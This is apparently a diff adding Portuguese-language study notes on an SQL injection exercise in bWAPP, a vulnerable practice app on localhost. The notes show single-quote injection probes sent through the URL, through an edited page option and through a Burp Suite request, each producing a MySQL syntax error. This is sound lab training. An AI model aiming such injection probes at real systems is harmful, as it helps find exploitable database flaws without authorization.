@@ -1,0 +1,42 @@
+
+Abrir nossa área de testes do bWAPP
+127.0.0.1/bWAPP
+
+Vamos testar: SQL Injection (GET/Select)
+
+O input de usuário não é introduzido manualmente e sim por seleção(combo box).
+
+Podemos adicionar valores de 3 formas:
+1 - Pela url.
+2 - Ver código-fonte e alterar valor das opções.
+3 - Interceptar a requisição por um web proxy
+
+
+-----------------(1 - URL)----------------------------------------
+Original: http://127.0.0.1/bwapp/sqli_2.php?movie=2&action=go
+Com Caracter: http://127.0.0.1/bwapp/sqli_2.php?movie=2'&action=go
+    |
+    |--> Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+----------------------------------------------------------------
+
+-----------------(2 - CÓDIGO-FONTE)-----------------------------
+ctrl+shift+c ou inspecionar elemento
+
+Clicar na determinada opção e colocar uma aspas simles.
+
+EX: <option value="4'">Terminator Salvation</option>
+
+Enviar!!
+    |
+    |--> Erro: Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+----------------------------------------------------------------
+
+
+-----------------(3 - BURPSUITE)-------------------------------
+
+Interceptar com o burp > Enviar para o repeat > Modificar e send.
+
+GET /bwapp/sqli_2.php?movie=1'&action=go HTTP/1.1
+    |
+    |--> Error: Error: You have an error in your SQL syntax;
+    ----------------------------------------------------------------
